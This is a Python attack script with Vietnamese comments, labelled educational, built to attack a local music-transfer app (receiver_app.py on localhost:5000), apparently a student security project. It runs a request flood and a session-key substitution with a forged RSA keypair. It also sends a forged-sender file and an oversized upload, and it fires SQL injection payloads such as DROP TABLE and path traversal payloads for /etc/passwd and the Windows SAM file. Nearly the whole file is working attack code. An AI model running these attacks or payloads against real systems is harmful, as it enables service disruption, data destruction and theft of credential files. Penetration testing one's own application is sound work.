"""
🔴 ATTACKER DEMO SCRIPT - Educational Purpose Only
Script tấn công TRỰC TIẾP vào receiver_app.py đang chạy
Dựa trên CACH_BI_HACK.md
"""

import sys
import os
# Add current directory to path for imports
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

import requests
import time
import json
import random
import threading
from datetime import datetime

class MusicSecurityAttacker:
    """Lớp tấn công trực tiếp vào receiver_app.py"""
    
    def __init__(self, target_url="http://localhost:5000"):
        self.target_url = target_url.rstrip("/")
        self.session = requests.Session()
        self.attack_log = []
    
    def log_attack(self, attack_type, details, result):
        """Ghi log tấn công"""
        entry = {
            "time": datetime.now().strftime("%H:%M:%S"),
            "type": attack_type,
            "details": details,
            "result": result
        }
        self.attack_log.append(entry)
        print(f"[{entry['time']}] [{attack_type.upper()}] {details} → {result}")
    
    # ═══════════════════════════════════════════════════════════════
    # ATTACK 1: SPAM / DoS Attack - Tấn công trực tiếp vào receiver
    # ═══════════════════════════════════════════════════════════════
    
    def spam_attack(self, duration=10, requests_per_second=50):
        """
        Tấn công spam bằng cách gửi hàng loạt requests đến receiver
        Mục tiêu: Làm quá tải server receiver_app.py
        """
        print(f"\n🚨 STARTING SPAM ATTACK - {duration}s @ {requests_per_second} req/s")
        
        start_time = time.time()
        success_count = 0
        fail_count = 0
        
        while time.time() - start_time < duration:
            try:
                # Gửi handshake requests liên tục đến receiver
                resp = requests.post(
                    f"{self.target_url}/api/handshake",
                    json={"msg": "Hello!"},
                    timeout=2
                )
                
                # Gửi status requests
                resp2 = requests.get(f"{self.target_url}/api/status", timeout=2)
                
                success_count += 2
                
            except requests.exceptions.Timeout:
                fail_count += 1
            except Exception as e:
                fail_count += 1
            
            # Delay để điều chỉnh tốc độ
            time.sleep(1.0 / requests_per_second)
        
        result = f"Sent {success_count} requests, {fail_count} failed"
        self.log_attack("spam", f"Target: {self.target_url}", result)
        return result
    
    # ═══════════════════════════════════════════════════════════════
    # ATTACK 2: MITM Attack - Thay thế session key trong key exchange
    # ═══════════════════════════════════════════════════════════════
    
    def mitm_attack_simulation(self):
        """
        Mô phỏng tấn công MITM vào receiver_app.py
        Attacker tạo evil session key và gửi đến receiver
        """
        print("\n🚨 STARTING MITM ATTACK SIMULATION")
        
        try:
            # Import trực tiếp từ crypto_utils (giống receiver_app.py)
            from crypto_utils import (
                generate_rsa_keypair, rsa_sign, rsa_encrypt_session_key,
                get_timestamp
            )
            
            # Bước 1: Lấy public key của receiver từ receiver_app.py
            resp = requests.get(f"{self.target_url}/api/get_public_key")
            if resp.status_code != 200:
                self.log_attack("mitm", "Failed to get receiver public key", "BLOCKED")
                return
            
            receiver_pub = resp.json()["public_key"]
            self.log_attack("mitm", "Intercepted Receiver public key", "SUCCESS")
            
            # Bước 2: Attacker tạo session key riêng (evil key) - đúng 24 bytes
            evil_session_key = b"EVIL_SESSION_KEY_123456"  # 24 bytes cho Triple DES
            print(f"  🔑 Attacker generated evil session key: {evil_session_key}")
            
            # Bước 3: Attacker tạo keypair giả mạo
            evil_priv, evil_pub = generate_rsa_keypair(1024)
            timestamp = get_timestamp()
            metadata_to_sign = f"music_transfer|{timestamp}"
            signature = rsa_sign(evil_priv, metadata_to_sign.encode())
            
            # Bước 4: Mã hóa evil session key với receiver public key
            encrypted_sk = rsa_encrypt_session_key(receiver_pub.encode(), evil_session_key)
            
            # Bước 5: Gửi evil session key đến receiver_app.py
            resp = requests.post(
                f"{self.target_url}/api/receive_session_key",
                json={
                    "encrypted_session_key": encrypted_sk,
                    "signature": signature,
                    "metadata_signed": metadata_to_sign,
                    "sender_public_key": evil_pub.decode()  # Attacker's public key
                }
            )
            
            if resp.status_code == 200:
                result = "Key exchange with EVIL key SUCCESSFUL - Receiver now compromised!"
            else:
                result = f"Key exchange FAILED: {resp.json()}"
            
            self.log_attack("mitm", "Attempted key substitution", result)
            return result
            
        except Exception as e:
            error_msg = f"MITM attack failed: {str(e)}"
            self.log_attack("mitm", "Attack execution", error_msg)
            return error_msg
    
    # ═══════════════════════════════════════════════════════════════
    # ATTACK 3: Fake Sender Attack - Giả mạo sender gửi file độc hại
    # ═══════════════════════════════════════════════════════════════
    
    def fake_sender_attack(self):
        """
        Giả mạo Sender gửi file độc hại đến receiver_app.py
        """
        print("\n🚨 STARTING FAKE SENDER ATTACK")
        
        try:
            # Import trực tiếp từ crypto_utils
            from crypto_utils import (
                generate_rsa_keypair, rsa_sign, rsa_encrypt_session_key,
                generate_session_key, generate_iv, triple_des_encrypt,
                des_encrypt_metadata, compute_integrity_hash, b64encode,
                get_timestamp
            )
            
            # Bước 1: Tạo cặp khóa giả mạo
            fake_priv, fake_pub = generate_rsa_keypair(1024)
            
            # Bước 2: Thực hiện handshake với receiver
            resp = requests.post(f"{self.target_url}/api/handshake", json={"msg": "Hello!"})
            if resp.status_code != 200:
                self.log_attack("fake_sender", "Handshake failed", "BLOCKED")
                return
            
            # Bước 3: Lấy public key của receiver
            resp = requests.get(f"{self.target_url}/api/get_public_key")
            if resp.status_code != 200:
                self.log_attack("fake_sender", "Failed to get public key", "BLOCKED")
                return
                
            receiver_pub = resp.json()["public_key"]
            
            # Bước 4: Tạo session key và mã hóa
            session_key = generate_session_key()
            encrypted_sk = rsa_encrypt_session_key(receiver_pub.encode(), session_key)
            
            # Tạo metadata giả mạo
            timestamp = get_timestamp()
            metadata = {
                "filename": "malicious_track.mp3",
                "artist": "Fake Artist",
                "copyright": "INFECTED",
                "size": 1024,
                "timestamp": timestamp
            }
            
            meta_bytes = json.dumps(metadata, ensure_ascii=False).encode()
            iv = generate_iv()
            des_key = session_key[:8]
            meta_cipher = des_encrypt_metadata(des_key, iv, meta_bytes)
            
            # Tạo file giả mạo (chứa malicious data thay vì nhạc)
            plaintext = b"MALICIOUS_PAYLOAD_SIMULATION_" * 100
            ciphertext = triple_des_encrypt(session_key, iv, plaintext)
            
            # Tính hash
            hash_hex = compute_integrity_hash(iv, ciphertext)
            
            # Ký gói tin với fake private key
            iv_b64 = b64encode(iv)
            cipher_b64 = b64encode(ciphertext)
            meta_b64 = b64encode(meta_cipher)
            sig_data = (iv_b64 + cipher_b64 + hash_hex).encode()
            signature = rsa_sign(fake_priv, sig_data)
            
            # Gửi file độc hại đến receiver_app.py
            packet = {
                "iv": iv_b64,
                "cipher": cipher_b64,
                "meta": meta_b64,
                "hash": hash_hex,
                "sig": signature
            }
            
            resp = requests.post(
                f"{self.target_url}/api/receive_file",
                json=packet
            )
            
            if resp.status_code == 200 and resp.json().get("status") == "ACK":
                result = "Malicious file ACCEPTED by receiver!"
            else:
                result = f"File REJECTED: {resp.json()}"
            
            self.log_attack("fake_sender", "Sent malicious file", result)
            return result
            
        except Exception as e:
            error_msg = f"Fake sender attack failed: {str(e)}"
            self.log_attack("fake_sender", "Attack execution", error_msg)
            return error_msg
    
    # ═══════════════════════════════════════════════════════════════
    # ATTACK 4: SQL Injection - Test các endpoint của receiver
    # ═══════════════════════════════════════════════════════════════
    
    def sql_injection_attack(self):
        """
        Thử SQL injection vào các endpoint của receiver_app.py
        """
        print("\n🚨 STARTING SQL INJECTION ATTACK")
        
        payloads = [
            "' OR '1'='1",
            "'; DROP TABLE files; --",
            "1' UNION SELECT * FROM users--",
            "admin'--",
            "' OR 1=1--",
        ]
        
        results = []
        for payload in payloads:
            try:
                # Thử inject vào endpoint /api/search (nếu có)
                resp = requests.get(
                    f"{self.target_url}/api/search",
                    params={"query": payload},
                    timeout=2
                )
                results.append(f"Payload: {payload[:20]}... → {resp.status_code}")
            except Exception as e:
                results.append(f"Payload: {payload[:20]}... → ERROR: {str(e)[:30]}")
        
        result = " | ".join(results)
        self.log_attack("sql_injection", "Tested SQL payloads", result[:100])
        return result
    
    # ═══════════════════════════════════════════════════════════════
    # ATTACK 5: Oversized Request Attack - Test giới hạn file size
    # ═══════════════════════════════════════════════════════════════
    
    def oversized_request_attack(self, size_mb=10):
        """
        Gửi file cực lớn để test giới hạn MAX_CONTENT_LENGTH
        Note: receiver_app.py has MAX_CONTENT_LENGTH = 100MB
        """
        print(f"\n🚨 STARTING OVERSIZED REQUEST ATTACK - {size_mb}MB")
        
        try:
            # Import crypto_utils for encryption
            from crypto_utils import (
                generate_session_key, generate_iv, triple_des_encrypt,
                des_encrypt_metadata, compute_integrity_hash, b64encode,
                get_timestamp
            )
            
            # First do handshake and key exchange
            resp = requests.post(f"{self.target_url}/api/handshake", json={"msg": "Hello!"})
            if resp.status_code != 200:
                self.log_attack("oversized", "Handshake failed", "BLOCKED")
                return
            
            resp = requests.get(f"{self.target_url}/api/get_public_key")
            receiver_pub = resp.json()["public_key"]
            
            # Create session key
            session_key = generate_session_key()
            from crypto_utils import rsa_encrypt_session_key
            encrypted_sk = rsa_encrypt_session_key(receiver_pub.encode(), session_key)
            
            timestamp = get_timestamp()
            metadata_to_sign = f"music_transfer|{timestamp}"
            from crypto_utils import rsa_sign, generate_rsa_keypair
            fake_priv, fake_pub = generate_rsa_keypair(1024)
            signature = rsa_sign(fake_priv, metadata_to_sign.encode())
            
            resp = requests.post(
                f"{self.target_url}/api/receive_session_key",
                json={
                    "encrypted_session_key": encrypted_sk,
                    "signature": signature,
                    "metadata_signed": metadata_to_sign,
                    "sender_public_key": fake_pub.decode()
                }
            )
            
            if resp.status_code != 200:
                self.log_attack("oversized", "Key exchange failed", "BLOCKED")
                return
            
            # Now create large encrypted file
            print(f"  📦 Generating {size_mb}MB of data...")
            large_data = b"A" * (size_mb * 1024 * 1024)
            
            iv = generate_iv()
            ciphertext = triple_des_encrypt(session_key, iv, large_data[:10000000])  # Limit to 10MB for demo
            hash_hex = compute_integrity_hash(iv, ciphertext)
            
            metadata = {
                "filename": "huge_file.mp3",
                "artist": "Disk Filler",
                "copyright": "ATTACK",
                "size": len(ciphertext),
                "timestamp": timestamp
            }
            
            import json
            meta_bytes = json.dumps(metadata, ensure_ascii=False).encode()
            des_key = session_key[:8]
            meta_cipher = des_encrypt_metadata(des_key, iv, meta_bytes)
            
            iv_b64 = b64encode(iv)
            cipher_b64 = b64encode(ciphertext)
            meta_b64 = b64encode(meta_cipher)
            sig_data = (iv_b64 + cipher_b64 + hash_hex).encode()
            signature = rsa_sign(fake_priv, sig_data)
            
            packet = {
                "iv": iv_b64,
                "cipher": cipher_b64,
                "meta": meta_b64,
                "hash": hash_hex,
                "sig": signature
            }
            
            # Send to receiver's /api/receive_file endpoint
            resp = requests.post(
                f"{self.target_url}/api/receive_file",
                json=packet,
                timeout=60
            )
            
            if resp.status_code == 200:
                result = f"Oversized file ACCEPTED! ({size_mb}MB) - Server vulnerable!"
            elif resp.status_code == 413:
                result = f"Request too large - BLOCKED (413) - Server protected"
            else:
                result = f"Request failed: {resp.status_code} - {resp.text[:100]}"
            
            self.log_attack("oversized", f"Sent {size_mb}MB file", result)
            return result
            
        except Exception as e:
            error_msg = f"Oversized attack failed: {str(e)}"
            self.log_attack("oversized", "Attack execution", error_msg)
            return error_msg
    
    # ═══════════════════════════════════════════════════════════════
    # ATTACK 6: Path Traversal - Test đường dẫn file
    # ═══════════════════════════════════════════════════════════════
    
    def path_traversal_attack(self):
        """
        Thử path traversal để đọc file nhạy cảm trên hệ thống
        """
        print("\n🚨 STARTING PATH TRAVERSAL ATTACK")
        
        # Các path traversal payloads
        payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        ]
        
        results = []
        for payload in payloads:
            try:
                # Thử truy cập file nhạy cảm
                resp = requests.get(
                    f"{self.target_url}/download/{payload}",
                    timeout=2
                )
                
                if resp.status_code == 200:
                    results.append(f"Payload: {payload[:30]}... → VULNERABLE!")
                else:
                    results.append(f"Payload: {payload[:30]}... → {resp.status_code}")
            except Exception as e:
                results.append(f"Payload: {payload[:30]}... → ERROR")
        
        result = " | ".join(results)
        self.log_attack("path_traversal", "Tested path traversal", result[:100])
        return result
    
    # ═══════════════════════════════════════════════════════════════
    # ATTACK SUMMARY
    # ═══════════════════════════════════════════════════════════════
    
    def print_attack_summary(self):
        """In tổng hợp kết quả tấn công"""
        print("\n" + "="*70)
        print("📊 ATTACK SUMMARY")
        print("="*70)
        
        for attack in self.attack_log:
            print(f"\n[{attack['time']}] {attack['type'].upper()}")
            print(f"  Details: {attack['details']}")
            print(f"  Result: {attack['result']}")
        
        print("\n" + "="*70)


def main():
    """Chạy demo các tấn công trực tiếp vào receiver_app"""
    print("🔴 MUSIC SECURITY ATTACKER DEMO")
    print("="*70)
    print("⚠️  WARNING: Educational purposes only!")
    print("⚠️  This attacks the ACTUAL receiver_app.py running on port 5000")
    print("="*70)
    
    # Mặc định tấn công vào receiver_app đang chạy
    target = "http://localhost:5000"
    
    print(f"\n🎯 Target: {target}")
    print("Make sure receiver_app.py is running on port 5000!")
    
    confirm = input("\nContinue? (y/N): ").strip().lower()
    if confirm != 'y':
        print("Cancelled.")
        return
    
    attacker = MusicSecurityAttacker(target)
    
    while True:
        print("\n" + "="*70)
        print("🎯 SELECT ATTACK TYPE (Against receiver_app.py)")
        print("="*70)
        print("1. Spam/DoS Attack - Flood server with requests")
        print("2. MITM Attack - Substitute session key")
        print("3. Fake Sender - Send malicious file")
        print("4. SQL Injection - Test SQL payloads")
        print("5. Oversized Request - Test file size limit")
        print("6. Path Traversal - Try to read sensitive files")
        print("7. Run ALL Attacks")
        print("0. Exit")
        print("="*70)
        
        choice = input("\nEnter choice (0-7): ").strip()
        
        if choice == "1":
            duration = int(input("Duration (seconds, default 10): ") or "10")
            attacker.spam_attack(duration=duration)
        
        elif choice == "2":
            attacker.mitm_attack_simulation()
        
        elif choice == "3":
            attacker.fake_sender_attack()
        
        elif choice == "4":
            attacker.sql_injection_attack()
        
        elif choice == "5":
            size = int(input("File size in MB (default 50): ") or "50")
            attacker.oversized_request_attack(size_mb=size)
        
        elif choice == "6":
            attacker.path_traversal_attack()
        
        elif choice == "7":
            print("\n🚨 RUNNING ALL ATTACKS...")
            time.sleep(1)
            attacker.spam_attack(duration=3)
            time.sleep(1)
            attacker.mitm_attack_simulation()
            time.sleep(1)
            attacker.fake_sender_attack()
            time.sleep(1)
            attacker.sql_injection_attack()
            time.sleep(1)
            attacker.oversized_request_attack(size_mb=10)
            time.sleep(1)
            attacker.path_traversal_attack()
            attacker.print_attack_summary()
        
        elif choice == "0":
            print("\n👋 Exiting...")
            attacker.print_attack_summary()
            break
        
        else:
            print("❌ Invalid choice!")


if __name__ == "__main__":
    main()